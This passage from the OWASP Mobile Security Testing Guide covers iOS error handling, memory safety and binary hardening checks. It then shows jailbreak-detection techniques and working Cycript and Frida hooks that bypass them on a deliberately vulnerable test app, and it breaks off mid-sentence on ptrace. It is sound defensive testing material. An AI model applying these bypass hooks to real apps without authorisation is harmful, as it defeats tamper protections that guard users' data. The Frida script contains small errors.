\begin{itemize}
\tightlist
\item
  Handle network and JSON decoding errors with a \texttt{Result} type:
\end{itemize}

\begin{verbatim}
struct MSTG: Codable {
    var root: String
    var plugins: [String]
    var structure: MSTGStructure
    var title: String
    var language: String
    var description: String
}

struct MSTGStructure: Codable {
    var readme: String
}

enum RequestError: Error {
    case requestError(Error)
    case noData
    case jsonError
}

func getMSTGInfo() {
    guard let url = URL(string: "https://raw.githubusercontent.com/OWASP/owasp-mstg/master/book.json") else {
        return
    }

    request(url: url) { result in
        switch result {
        case let .success(data):
            // Handle success with MSTG data
            let mstgTitle = data.title
            let mstgDescription = data.description
        case let .failure(error):
            // Handle failure
            switch error {
            case let .requestError(error):
                // Handle request error (with error)
            case .noData:
                // Handle no data received in response
            case .jsonError:
                // Handle error parsing JSON
            }
        }
    }
}

func request(url: URL, completion: @escaping (Result<MSTG, RequestError>) -> Void) {
    let task = URLSession.shared.dataTask(with: url) { data, _, error in
        if let error = error {
            return completion(.failure(.requestError(error)))
        } else {
            if let data = data {
                let decoder = JSONDecoder()
                guard let response = try? decoder.decode(MSTG.self, from: data) else {
                    return completion(.failure(.jsonError))
                }
                return completion(.success(response))
            }
        }
    }
    task.resume()
}
\end{verbatim}

\hypertarget{static-analysis-81}{%
\paragraph{Static Analysis}\label{static-analysis-81}}

Review the source code to understand how the application handles various
types of errors (IPC communications, remote services invocation, etc.).
The following sections list examples of what you should check for each
language at this stage.

\hypertarget{static-analysis-in-objective-c}{%
\subparagraph{Static Analysis in
Objective-C}\label{static-analysis-in-objective-c}}

Make sure that

\begin{itemize}
\tightlist
\item
  the application uses a well-designed and unified scheme to handle
  exceptions and errors,
\item
  the Cocoa framework exceptions are handled correctly,
\item
  the allocated memory in the \texttt{@try} blocks is released in the
  \texttt{@finally} blocks,
\item
  for every \texttt{@throw}, the calling method has a proper
  \texttt{@catch} at the level of either the calling method or the
  \texttt{NSApplication}/\texttt{UIApplication} objects to clean up
  sensitive information and possibly recover,
\item
  the application doesn't expose sensitive information while handling
  errors in its UI or in its log statements, and the statements are
  verbose enough to explain the issue to the user,
\item
  high-risk applications' confidential information, such as keying
  material and authentication information, is always wiped during the
  execution of \texttt{@finally} blocks,
\item
  \texttt{raise} is rarely used (it's used when the program must be
  terminated without further warning),
\item
  \texttt{NSError} objects don't contain data that might leak sensitive
  information.
\end{itemize}

\hypertarget{static-analysis-in-swift}{%
\subparagraph{Static Analysis in Swift}\label{static-analysis-in-swift}}

Make sure that

\begin{itemize}
\tightlist
\item
  the application uses a well-designed and unified scheme to handle
  errors,
\item
  the application doesn't expose sensitive information while handling
  errors in its UI or in its log statements, and the statements are
  verbose enough to explain the issue to the user,
\item
  high-risk applications' confidential information, such as keying
  material and authentication information, is always wiped during the
  execution of \texttt{defer} blocks,
\item
  \texttt{try!} is used only with proper guarding up front (to
  programmatically verify that the method that's called with
  \texttt{try!} can't throw an error).
\end{itemize}

\hypertarget{proper-error-handling}{%
\subparagraph{Proper Error Handling}\label{proper-error-handling}}

Developers can implement proper error handling in several ways:

\begin{itemize}
\tightlist
\item
  Make sure that the application uses a well-designed and unified scheme
  to handle errors.
\item
  Make sure that all logging is removed or guarded as described in the
  test case ``Testing for Debugging Code and Verbose Error Logging''.
\item
  For a high-risk application written in Objective-C: create an
  exception handler that removes secrets that shouldn't be easily
  retrievable. The handler can be set via
  \texttt{NSSetUncaughtExceptionHandler}.
\item
  Refrain from using \texttt{try!} in Swift unless you're certain that
  there's no error in the throwing method that's being called.
\item
  Make sure that the Swift error doesn't propagate into too many
  intermediate methods.
\end{itemize}

\hypertarget{dynamic-testing-1}{%
\paragraph{Dynamic Testing}\label{dynamic-testing-1}}

There are several dynamic analysis methods:

\begin{itemize}
\tightlist
\item
  Enter unexpected values in the iOS application's UI fields.
\item
  Test the custom URL schemes, pasteboard, and other inter-app
  communication controls by providing unexpected or exception-raising
  values.
\item
  Tamper with the network communication and/or the files stored by the
  application.
\item
  For Objective-C, you can use Cycript to hook into methods and provide
  them arguments that may cause the callee to throw an exception.
\end{itemize}

In most cases, the application should not crash. Instead, it should

\begin{itemize}
\tightlist
\item
  recover from the error or enter a state from which it can inform the
  user that it can't continue,
\item
  provide a message (which shouldn't leak sensitive information) to get
  the user to take appropriate action,
\item
  withhold information from the application's logging mechanisms.
\end{itemize}

\hypertarget{memory-corruption-bugs-mstg-code-8-2}{%
\subsubsection{Memory Corruption Bugs
(MSTG-CODE-8)}\label{memory-corruption-bugs-mstg-code-8-2}}

iOS applications have various ways to run into memory corruption bugs:
first there are the native code issues which have been mentioned in the
general Memory Corruption Bugs section. Next, there are various unsafe
operations with both Objective-C and Swift to actually wrap around
native code which can create issues. Last, both Swift and Objective-C
implementations can result in memory leaks due to retaining objects
which are no longer in use.

\hypertarget{static-analysis-82}{%
\paragraph{Static Analysis}\label{static-analysis-82}}

Are there native code parts? If so: check for the given issues in the
general memory corruption section. Native code is a little harder to
spot when compiled. If you have the sources then you can see that C
files use .c source files and .h header files and C++ uses .cpp files
and .h files. This is a little different from the .swift and the .m
source files for Swift and Objective-C. These files can be part of the
sources, or part of third party libraries, registered as frameworks and
imported through various tools, such as Carthage, the Swift Package
Manager or Cocoapods.

For any managed code (Objective-C / Swift) in the project, check the
following items:

\begin{itemize}
\tightlist
\item
  The doubleFree issue: when \texttt{free} is called twice for a given
  region instead of once.
\item
  Retaining cycles: look for cyclic dependencies by means of strong
  references of components to one another which keep materials in
  memory.
\item
  Using instances of \texttt{UnsafePointer} can be managed wrongly,
  which will allow for various memory corruption issues.
\item
  Trying to manage the reference count to an object by
  \texttt{Unmanaged} manually, leading to wrong counter numbers and a
  too late/too soon release.
\end{itemize}

\href{https://academy.realm.io/posts/russ-bishop-unsafe-swift/}{A great
talk is given on this subject at Realm academy} and
\href{https://www.raywenderlich.com/780-unsafe-swift-using-pointers-and-interacting-with-c}{a
nice tutorial to see what is actually happening} is provided by Ray
Wenderlich on this subject.

\begin{quote}
Please note that with Swift 5 you can only deallocate full blocks, which
means the playground has changed a bit.
\end{quote}

\hypertarget{dynamic-analysis-77}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-77}}

There are various tools provided which help to identify memory bugs
within Xcode, such as the Debug Memory graph introduced in Xcode 8 and
the Allocations and Leaks instrument in Xcode.

Next, you can check whether memory is freed too fast or too slow by
enabling \texttt{NSAutoreleaseFreedObjectCheckEnabled},
\texttt{NSZombieEnabled}, \texttt{NSDebugEnabled} in Xcode while testing
the application.

There are various well written explanations which can help with taking
care of memory management. These can be found in the reference list of
this chapter.

\hypertarget{make-sure-that-free-security-features-are-activated-mstg-code-9-1}{%
\subsubsection{Make Sure That Free Security Features Are Activated
(MSTG-CODE-9)}\label{make-sure-that-free-security-features-are-activated-mstg-code-9-1}}

\hypertarget{overview-75}{%
\paragraph{Overview}\label{overview-75}}

Although Xcode enables all binary security features by default, it may
be relevant to verify this for an old application or to check for the
misconfiguration of compilation options. The following features are
applicable:

\begin{itemize}
\tightlist
\item
  \textbf{ARC} - Automatic Reference Counting - A memory management
  feature that adds retain and release messages when required
\item
  \textbf{Stack Canary} - Helps prevent buffer overflow attacks by means
  of having a small integer right before the return pointer. A buffer
  overflow attack often overwrites a region of memory in order to
  overwrite the return pointer and take over the process-control. In
  that case, the canary gets overwritten as well. Therefore, the value
  of the canary is always checked to make sure it has not changed before
  a routine uses the return pointer on the stack.
\item
  \textbf{PIE} - Position Independent Executable - enables full ASLR for
  binary
\end{itemize}

\hypertarget{static-analysis-83}{%
\paragraph{Static Analysis}\label{static-analysis-83}}

\hypertarget{xcode-project-settings}{%
\subparagraph{Xcode Project Settings}\label{xcode-project-settings}}

\begin{itemize}
\tightlist
\item
  Stack-smashing protection
\end{itemize}

Steps for enabling Stack-smashing protection in an iOS application:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  In Xcode, select your target in the ``Targets'' section, then click
  the ``Build Settings'' tab to view the target's settings.
\item
  Make sure that the ``-fstack-protector-all'' option is selected in the
  ``Other C Flags'' section.
\item
  Make sure that Position Independent Executables (PIE) support is
  enabled.
\end{enumerate}

Steps for building an iOS application as PIE:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  In Xcode, select your target in the ``Targets'' section, then click
  the ``Build Settings'' tab to view the target's settings.
\item
  Set the iOS Deployment Target to iOS 4.3 or later.
\item
  Make sure that ``Generate Position-Dependent Code'' is set to its
  default value (``NO'').
\item
  Make sure that ``Don't Create Position Independent Executables'' is
  set to its default value (``NO'').
\end{enumerate}

\begin{itemize}
\tightlist
\item
  ARC protection
\end{itemize}

Steps for enabling ACR protection for an iOS application:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  In Xcode, select your target in the ``Targets'' section, then click
  the ``Build Settings'' tab to view the target's settings.
\item
  Make sure that ``Objective-C Automatic Reference Counting'' is set to
  its default value (``YES'').
\end{enumerate}

See the
\href{https://developer.apple.com/library/mac/qa/qa1788/_index.html}{Technical
Q\&A QA1788 Building a Position Independent Executable}.

\hypertarget{with-otool}{%
\subparagraph{With otool}\label{with-otool}}

Below are procedures for checking the binary security features described
above. All the features are enabled in these examples.

\begin{itemize}
\tightlist
\item
  PIE:
\end{itemize}

\begin{verbatim}
$ unzip DamnVulnerableiOSApp.ipa
$ cd Payload/DamnVulnerableIOSApp.app
$ otool -hv DamnVulnerableIOSApp
DamnVulnerableIOSApp (architecture armv7):
Mach header
magic cputype cpusubtype caps filetype ncmds sizeofcmds flags
MH_MAGIC ARM V7 0x00 EXECUTE 38 4292 NOUNDEFS DYLDLINK TWOLEVEL
WEAK_DEFINES BINDS_TO_WEAK PIE
DamnVulnerableIOSApp (architecture arm64):
Mach header
magic cputype cpusubtype caps filetype ncmds sizeofcmds flags
MH_MAGIC_64 ARM64 ALL 0x00 EXECUTE 38 4856 NOUNDEFS DYLDLINK TWOLEVEL
WEAK_DEFINES BINDS_TO_WEAK PIE
\end{verbatim}

\begin{itemize}
\tightlist
\item
  stack canary:
\end{itemize}

\begin{verbatim}
$ otool -Iv DamnVulnerableIOSApp | grep stack
0x0046040c 83177 ___stack_chk_fail
0x0046100c 83521 _sigaltstack
0x004fc010 83178 ___stack_chk_guard
0x004fe5c8 83177 ___stack_chk_fail
0x004fe8c8 83521 _sigaltstack
0x00000001004b3fd8 83077 ___stack_chk_fail
0x00000001004b4890 83414 _sigaltstack
0x0000000100590cf0 83078 ___stack_chk_guard
0x00000001005937f8 83077 ___stack_chk_fail
0x0000000100593dc8 83414 _sigaltstack
\end{verbatim}

\begin{itemize}
\tightlist
\item
  Automatic Reference Counting:
\end{itemize}

\begin{verbatim}
$ otool -Iv DamnVulnerableIOSApp | grep release
0x0045b7dc 83156 ___cxa_guard_release
0x0045fd5c 83414 _objc_autorelease
0x0045fd6c 83415 _objc_autoreleasePoolPop
0x0045fd7c 83416 _objc_autoreleasePoolPush
0x0045fd8c 83417 _objc_autoreleaseReturnValue
0x0045ff0c 83441 _objc_release
[SNIP]
\end{verbatim}

\hypertarget{with-idb}{%
\subparagraph{With idb}\label{with-idb}}

IDB automates the processes of checking for stack canary and PIE
support. Select the target binary in the IDB GUI and click the ``Analyze
Binary\ldots{}'' button.

\begin{figure}
\centering
\includegraphics[width=3.64583in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/88d9e255a1243b1933f293f801ad60b967a4ed03.png}
\caption{IDB Analyze Binary}
\end{figure}

\hypertarget{dynamic-analysis-78}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-78}}

Dynamic analysis is not applicable for finding security features offered
by the toolchain.

\hypertarget{references-23}{%
\subsubsection{References}\label{references-23}}

\hypertarget{memory-management---dynamic-analysis-examples}{%
\paragraph{Memory management - dynamic analysis
examples}\label{memory-management---dynamic-analysis-examples}}

\begin{itemize}
\tightlist
\item
  \url{https://developer.ibm.com/tutorials/mo-ios-memory/}
\item
  \url{https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/MemoryMgmt/Articles/MemoryMgmt.html}
\item
  \url{https://medium.com/zendesk-engineering/ios-identifying-memory-leaks-using-the-xcode-memory-graph-debugger-e84f097b9d15}
\end{itemize}

\hypertarget{owasp-masvs-18}{%
\paragraph{OWASP MASVS}\label{owasp-masvs-18}}

\begin{itemize}
\tightlist
\item
  MSTG-CODE-1: ``The app is signed and provisioned with a valid
  certificate, of which the private key is properly protected.''
\item
  MSTG-CODE-2: ``The app has been built in release mode, with settings
  appropriate for a release build (e.g.~non-debuggable).''
\item
  MSTG-CODE-3: ``Debugging symbols have been removed from native
  binaries.''
\item
  MSTG-CODE-4: ``Debugging code and developer assistance code (e.g.~test
  code, backdoors, hidden settings) have been removed. The app does not
  log verbose errors or debugging messages.''
\item
  MSTG-CODE-5: ``All third party components used by the mobile app, such
  as libraries and frameworks, are identified, and checked for known
  vulnerabilities.''
\item
  MSTG-CODE-6: ``The app catches and handles possible exceptions.''
\item
  MSTG-CODE-8: ``In unmanaged code, memory is allocated, freed and used
  securely.''
\item
  MSTG-CODE-9: ``Free security features offered by the toolchain, such
  as byte-code minification, stack protection, PIE support and automatic
  reference counting, are activated.''
\end{itemize}

\hypertarget{tools-13}{%
\subparagraph{Tools}\label{tools-13}}

\begin{itemize}
\tightlist
\item
  Swift Package Manager - \url{https://swift.org/package-manager/}
\item
  Carthage - \url{https://github.com/carthage/carthage}
\item
  CocoaPods - \url{https://CocoaPods.org}
\item
  OWASP Dependency Check -
  \url{https://jeremylong.github.io/DependencyCheck/}
\item
  Sourceclear - \url{https://sourceclear.com}
\item
  class-dump - \url{https://github.com/nygard/class-dump}
\item
  RetireJS - \url{https://retirejs.github.io/retire.js/}
\item
  idb - \url{https://github.com/dmayer/idb}
\item
  Codesign -
  \url{https://developer.apple.com/library/archive/documentation/Security/Conceptual/CodeSigningGuide/Procedures/Procedures.html}
\end{itemize}

\hypertarget{ios-anti-reversing-defenses}{%
\subsection{iOS Anti-Reversing
Defenses}\label{ios-anti-reversing-defenses}}

\hypertarget{jailbreak-detection-mstg-resilience-1}{%
\subsubsection{Jailbreak Detection
(MSTG-RESILIENCE-1)}\label{jailbreak-detection-mstg-resilience-1}}

\hypertarget{overview-76}{%
\paragraph{Overview}\label{overview-76}}

Jailbreak detection mechanisms are added to reverse engineering defense
to make running the app on a jailbroken device more difficult. This
blocks some of the tools and techniques reverse engineers like to use.
Like most other types of defense, jailbreak detection is not very
effective by itself, but scattering checks throughout the app's source
code can improve the effectiveness of the overall anti-tampering scheme.
A
\href{https://www.trustwave.com/Resources/SpiderLabs-Blog/Jailbreak-Detection-Methods/}{list
of typical jailbreak detection techniques for iOS was published by
Trustwave}.

\hypertarget{file-based-checks}{%
\subparagraph{File-based Checks}\label{file-based-checks}}

Check for files and directories typically associated with jailbreaks,
such as:

\begin{verbatim}
/Applications/Cydia.app
/Applications/FakeCarrier.app
/Applications/Icy.app
/Applications/IntelliScreen.app
/Applications/MxTube.app
/Applications/RockApp.app
/Applications/SBSettings.app
/Applications/WinterBoard.app
/Applications/blackra1n.app
/Library/MobileSubstrate/DynamicLibraries/LiveClock.plist
/Library/MobileSubstrate/DynamicLibraries/Veency.plist
/Library/MobileSubstrate/MobileSubstrate.dylib
/System/Library/LaunchDaemons/com.ikey.bbot.plist
/System/Library/LaunchDaemons/com.saurik.Cydia.Startup.plist
/bin/bash
/bin/sh
/etc/apt
/etc/ssh/sshd_config
/private/var/lib/apt
/private/var/lib/cydia
/private/var/mobile/Library/SBSettings/Themes
/private/var/stash
/private/var/tmp/cydia.log
/var/tmp/cydia.log
/usr/bin/sshd
/usr/libexec/sftp-server
/usr/libexec/ssh-keysign
/usr/sbin/sshd
/var/cache/apt
/var/lib/apt
/var/lib/cydia
/usr/sbin/frida-server
/usr/bin/cycript
/usr/local/bin/cycript
/usr/lib/libcycript.dylib
/var/log/syslog
\end{verbatim}

\hypertarget{checking-file-permissions}{%
\subparagraph{Checking File
Permissions}\label{checking-file-permissions}}

Another way to check for jailbreaking mechanisms is to try to write to a
location that's outside the application's sandbox. You can do this by
having the application attempt to create a file in, for example, the
\texttt{/private\ directory}. If the file is created successfully, the
device has been jailbroken.

\begin{verbatim}
NSError *error;
NSString *stringToBeWritten = @"This is a test.";
[stringToBeWritten writeToFile:@"/private/jailbreak.txt" atomically:YES
         encoding:NSUTF8StringEncoding error:&error];
if(error==nil){
   //Device is jailbroken
   return YES;
 } else {
   //Device is not jailbroken
   [[NSFileManager defaultManager] removeItemAtPath:@"/private/jailbreak.txt" error:nil];
 }
\end{verbatim}

\hypertarget{checking-protocol-handlers}{%
\subparagraph{Checking Protocol
Handlers}\label{checking-protocol-handlers}}

You can check protocol handlers by attempting to open a Cydia URL. The
Cydia app store, which practically every jailbreaking tool installs by
default, installs the cydia:// protocol handler.

\begin{verbatim}
if([[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:@"cydia://package/com.example.package"]]){
\end{verbatim}

\hypertarget{calling-system-apis}{%
\subparagraph{Calling System APIs}\label{calling-system-apis}}

Calling the \texttt{system} function with a ``NULL'' argument on a
non-jailbroken device will return ``0''; doing the same thing on a
jailbroken device will return ``1''. This difference is due to the
function's checking for access to \texttt{/bin/sh} on jailbroken devices
only.

\hypertarget{bypassing-jailbreak-detection}{%
\paragraph{Bypassing Jailbreak
Detection}\label{bypassing-jailbreak-detection}}

Once you start an application that has jailbreak detection enabled on a
jailbroken device, you'll notice one of the following things:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  The application closes immediately, without any notification.
\item
  A pop-up window indicates that the application won't run on a
  jailbroken device.
\end{enumerate}

In the first case, make sure the application is fully functional on
non-jailbroken devices. The application may be crashing or it may have a
bug that causes it to terminate. This may happen while you're testing a
preproduction version of the application.

Let's look at bypassing jailbreak detection using the Damn Vulnerable
iOS application as an example again. After loading the binary into
Hopper, you need to wait until the application is fully disassembled
(look at the top bar to check the status). Then look for the ``jail''
string in the search box. You'll see two classes: \texttt{SFAntiPiracy}
and \texttt{JailbreakDetectionVC}. You may want to decompile the
functions to see what they are doing and, in particular, what they
return.

\begin{figure}
\centering
\includegraphics[width=3.64583in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/cf614ae451bbad93635811b9e53554f0f55bbc3c.png}
\caption{Images/Chapters/0x06b/HopperDisassembling.png}
\end{figure}

\begin{figure}
\centering
\includegraphics[width=3.64583in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/a9246692bf50d7cf2d6312b100d30e7c6deea379.png}
\caption{Images/Chapters/0x06b/HopperDecompile.png}
\end{figure}

As you can see, there's a class method
(\texttt{+{[}SFAntiPiracy\ isTheDeviceJailbroken{]}}) and an instance
method (\texttt{-{[}JailbreakDetectionVC\ isJailbroken{]}}). The main
difference is that we can inject Cycript in the app and call the class
method directly, whereas the instance method requires first looking for
instances of the target class. The function \texttt{choose} will look in
the memory heap for known signatures of a given class and return an
array of instances. Putting an application into a desired state (so that
the class is indeed instantiated) is important.

Let's inject Cycript into our process (look for your PID with
\texttt{top}):

\begin{verbatim}
iOS8-jailbreak:~ root# cycript -p 12345
cy# [SFAntiPiracy isTheDeviceJailbroken]
true
\end{verbatim}

As you can see, our class method was called directly, and it returned
``true''. Now, let's call the
\texttt{-{[}JailbreakDetectionVC\ isJailbroken{]}} instance method.
First, we have to call the \texttt{choose} function to look for
instances of the \texttt{JailbreakDetectionVC} class.

\begin{verbatim}
cy# a=choose(JailbreakDetectionVC)
[]
\end{verbatim}

Oops! The return value is an empty array. That means that there are no
instances of this class registered in the runtime. In fact, we haven't
clicked the second ``Jailbreak Test'' button, which initializes this
class:

\begin{verbatim}
cy# a=choose(JailbreakDetectionVC)
[#"<JailbreakDetectionVC: 0x14ee15620>"]
cy# [a[0] isJailbroken]
True
\end{verbatim}

\begin{figure}
\centering
\includegraphics[width=2.60417in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/aa88d9be69692cc72825cb21b5db66c3a3b04933.png}
\caption{Images/Chapters/0x06j/deviceISjailbroken.png}
\end{figure}

Now you understand why having your application in a desired state is
important. At this point, bypassing jailbreak detection with Cycript is
trivial. We can see that the function returns a boolean; we just need to
replace the return value. We can replace the return value by replacing
the function implementation with Cycript. Please note that this will
actually replace the function under its given name, so beware of side
effects if the function modifies anything in the application:

\begin{verbatim}
cy# JailbreakDetectionVC.prototype.isJailbroken=function(){return false}
cy# [a[0] isJailbroken]
false
\end{verbatim}

\begin{figure}
\centering
\includegraphics[width=2.60417in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/a3c0b37c8ec6ce33695b9fb2794d8af5880f033d.png}
\caption{Images/Chapters/0x06j/deviceisNOTjailbroken.png}
\end{figure}

In this case we have bypassed the jailbreak detection of the
application!

Now, imagine that the application is closing immediately after detecting
that the device is jailbroken. You don't have time to launch Cycript and
replace the function implementation. Instead, you have to use
CydiaSubstrate, employ a proper hooking function like
\texttt{MSHookMessageEx}, and compile the tweak. There are
\href{http://delaat.net/rp/2015-2016/p51/report.pdf}{good sources} for
how to do this; however, by using Frida, we can more easily perform
early instrumentation and we can build on our gathered skills from
previous tests.

One feature of Frida that we will use to bypass jailbreak detection is
so-called early instrumentation, that is, we will replace function
implementation at startup.

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Make sure that \texttt{frida-server} is running on your iOS Device.
\item
  Make sure that \texttt{Frida} is
  \href{https://www.frida.re/docs/installation/}{installed} on your
  workstation.
\item
  The iOS device must be connected via USB cable.
\item
  Use \texttt{frida-trace} on your workstation:
\end{enumerate}

\begin{verbatim}
$ frida-trace -U -f /Applications/DamnVulnerableIOSApp.app/DamnVulnerableIOSApp  -m "-[JailbreakDetectionVC isJailbroken]"
\end{verbatim}

This will start DamnVulnerableIOSApp, trace calls to
\texttt{-{[}JailbreakDetectionVC\ isJailbroken{]}}, and create a
JavaScript hook with the \texttt{onEnter} and \texttt{onLeave} callback
functions. Now, replacing the return value via \texttt{value.replace} is
trivial, as shown in the following example:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{    onLeave}\OperatorTok{:} \KeywordTok{function}\NormalTok{ (log}\OperatorTok{,}\NormalTok{ retval}\OperatorTok{,}\NormalTok{ state) }\OperatorTok{\{}
    \VariableTok{console}\NormalTok{.}\AttributeTok{log}\NormalTok{(}\StringTok{"Function [JailbreakDetectionVC isJailbroken] originally returned:"}\OperatorTok{+}\NormalTok{ retval)}\OperatorTok{;}
    \VariableTok{retval}\NormalTok{.}\AttributeTok{replace}\NormalTok{(}\DecValTok{0}\NormalTok{)}\OperatorTok{;}  
      \VariableTok{console}\NormalTok{.}\AttributeTok{log}\NormalTok{(}\StringTok{"Changing the return value to:"}\OperatorTok{+}\NormalTok{retval)}\OperatorTok{;}
    \OperatorTok{\}}
\end{Highlighting}
\end{Shaded}

This will provide the following output:

\begin{verbatim}
$ frida-trace -U -f /Applications/DamnVulnerableIOSApp.app/DamnVulnerableIOSApp  -m "-[JailbreakDetectionVC isJailbroken]:"

Instrumenting functions...                                           `...
-[JailbreakDetectionVC isJailbroken]: Loaded handler at "./__handlers__/__JailbreakDetectionVC_isJailbroken_.js"
Started tracing 1 function. Press Ctrl+C to stop.
Function [JailbreakDetectionVC isJailbroken] originally returned:0x1
Changing the return value to:0x0
           /* TID 0x303 */
  6890 ms  -[JailbreakDetectionVC isJailbroken]
Function [JailbreakDetectionVC isJailbroken] originally returned:0x1
Changing the return value to:0x0
 22475 ms  -[JailbreakDetectionVC isJailbroken]
\end{verbatim}

Note the two calls to
\texttt{-{[}JailbreakDetectionVC\ isJailbroken{]}}, which correspond to
two physical taps on the app's GUI.

One more way to bypass Jailbreak detection mechanisms that rely on file
system checks is objection. You can find the implementation of the
jailbreak bypass in the
\href{https://github.com/sensepost/objection/blob/master/agent/src/ios/jailbreak.ts}{jailbreak.ts
script}.

See below a Python script for hooking Objective-C methods and native
functions:

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ frida}
\ImportTok{import}\NormalTok{ sys}

\ControlFlowTok{try}\NormalTok{:}
\NormalTok{    session }\OperatorTok{=}\NormalTok{ frida.get\_usb\_device().attach(}\StringTok{"Target Process"}\NormalTok{)}
\ControlFlowTok{except}\NormalTok{ frida.ProcessNotFoundError:}
    \BuiltInTok{print} \StringTok{"Failed to attach to the target process. Did you launch the app?"}
\NormalTok{    sys.exit(}\DecValTok{0}\NormalTok{)}\OperatorTok{;}

\NormalTok{script }\OperatorTok{=}\NormalTok{ session.create\_script(}\StringTok{"""}

\StringTok{    // Handle fork() based check}

\StringTok{    var fork = Module.findExportByName("libsystem\_c.dylib", "fork");}

\StringTok{    Interceptor.replace(fork, new NativeCallback(function () \{}
\StringTok{        send("Intercepted call to fork().");}
\StringTok{        return {-}1;}
\StringTok{    \}, \textquotesingle{}int\textquotesingle{}, []));}

\StringTok{    var system = Module.findExportByName("libsystem\_c.dylib", "system");}

\StringTok{    Interceptor.replace(system, new NativeCallback(function () \{}
\StringTok{        send("Intercepted call to system().");}
\StringTok{        return 0;}
\StringTok{    \}, \textquotesingle{}int\textquotesingle{}, []));}

\StringTok{    // Intercept checks for Cydia URL handler}

\StringTok{    var canOpenURL = ObjC.classes.UIApplication["{-} canOpenURL:"];}

\StringTok{    Interceptor.attach(canOpenURL.implementation, \{}
\StringTok{        onEnter: function(args) \{}
\StringTok{          var url = ObjC.Object(args[2]);}
\StringTok{          send("[UIApplication canOpenURL:] " + path.toString());}
\StringTok{          \},}
\StringTok{        onLeave: function(retval) \{}
\StringTok{            send ("canOpenURL returned: " + retval);}
\StringTok{        \}}

\StringTok{    \});}

\StringTok{    // Intercept file existence checks via [NSFileManager fileExistsAtPath:]}

\StringTok{    var fileExistsAtPath = ObjC.classes.NSFileManager["{-} fileExistsAtPath:"];}
\StringTok{    var hideFile = 0;}

\StringTok{    Interceptor.attach(fileExistsAtPath.implementation, \{}
\StringTok{        onEnter: function(args) \{}
\StringTok{          var path = ObjC.Object(args[2]);}
\StringTok{          // send("[NSFileManager fileExistsAtPath:] " + path.toString());}

\StringTok{          if (path.toString() == "/Applications/Cydia.app" || path.toString() == "/bin/bash") \{}
\StringTok{            hideFile = 1;}
\StringTok{          \}}
\StringTok{        \},}
\StringTok{        onLeave: function(retval) \{}
\StringTok{            if (hideFile) \{}
\StringTok{                send("Hiding jailbreak file...");MM}
\StringTok{                retval.replace(0);}
\StringTok{                hideFile = 0;}
\StringTok{            \}}

\StringTok{            // send("fileExistsAtPath returned: " + retval);}
\StringTok{      \}}
\StringTok{    \});}


\StringTok{    /* If the above doesn\textquotesingle{}t work, you might want to hook low level file APIs as well}

\StringTok{        var openat = Module.findExportByName("libsystem\_c.dylib", "openat");}
\StringTok{        var stat = Module.findExportByName("libsystem\_c.dylib", "stat");}
\StringTok{        var fopen = Module.findExportByName("libsystem\_c.dylib", "fopen");}
\StringTok{        var open = Module.findExportByName("libsystem\_c.dylib", "open");}
\StringTok{        var faccesset = Module.findExportByName("libsystem\_kernel.dylib", "faccessat");}

\StringTok{    */}

\StringTok{"""}\NormalTok{)}

\KeywordTok{def}\NormalTok{ on\_message(message, data):}
    \ControlFlowTok{if} \StringTok{\textquotesingle{}payload\textquotesingle{}} \KeywordTok{in}\NormalTok{ message:}
            \BuiltInTok{print}\NormalTok{(message[}\StringTok{\textquotesingle{}payload\textquotesingle{}}\NormalTok{])}

\NormalTok{script.on(}\StringTok{\textquotesingle{}message\textquotesingle{}}\NormalTok{, on\_message)}
\NormalTok{script.load()}
\NormalTok{sys.stdin.read()}
\end{Highlighting}
\end{Shaded}

\hypertarget{testing-anti-debugging-detection-mstg-resilience-2-1}{%
\subsubsection{Testing Anti-Debugging Detection
(MSTG-RESILIENCE-2)}\label{testing-anti-debugging-detection-mstg-resilience-2-1}}

\hypertarget{overview-77}{%
\paragraph{Overview}\label{overview-77}}

Exploring applications using a debugger is a very powerful technique
during reversing. You can not only track variables containing sensitive
data and modify the control flow of the application, but also read and
modify memory and registers.

There are several anti-debugging techniques applicable to iOS which can
be categorized as preventive or as reactive; a few of them are discussed
below. As a first line of defense, you can use preventive techniques to
impede the debugger from attaching to the application at all.
Additionally, you can also apply reactive techniques which allow the
application to detect the presence of a debugger and have a chance to
diverge from normal behavior. When properly distributed throughout the
app, these techniques act as a secondary or supportive measure to
increase the overall resilience.

Application developers of apps processing highly sensitive data should
be aware of the fact that preventing debugging is virtually impossible.
If the app is publicly available, it can be run on an untrusted device,
that is under full control of the attacker. A very determined attacker
will eventually manage to bypass all the app's anti-debugging controls
by patching the app binary or by dynamically modifying the app's
behavior at runtime with tools such as Frida.

According to Apple, you should
``\href{https://developer.apple.com/library/archive/qa/qa1361/_index.html}{restrict
restrict use of the above code to the debug build of your program}''.
However, research shows that
\href{https://seredynski.com/articles/a-security-review-of-1300-appstore-applications.html}{many
App Store apps often include these checks}.

\hypertarget{using-ptrace}{%
\subparagraph{Using ptrace}\label{using-ptrace}}

As seen in chapter
``\href{0x06c-Reverse-Engineering-and-Tampering.md\#debugging}{Tampering
and Reverse Engineering on iOS}'', the iOS XNU kernel implements a
\texttt{ptrace} system call that's lacking most of the functionality
required to properly debug a process (e.g.~it allows attaching/stepping
but not read/write of memory and registers).

Nevertheless, the iOS implementation of the \texttt{ptrace} syscall
contains a nonstandard and very useful feature: preventing the debugging
of processes. This feature is implemented as the
\texttt{PT\_DENY\_ATTACH} request, as described in the
\href{https://developer.apple.com/library/archive/documentation/System/Conceptual/ManPages_iPhoneOS/man2/ptrace.2.html}{official
BSD System Calls Manual}. In simple words, it ensures that no other
debugger can attach to the calling process; if a debugger attempts to
attach, the process will terminate. Using \texttt{PT\_DENY\_ATTACH} is a
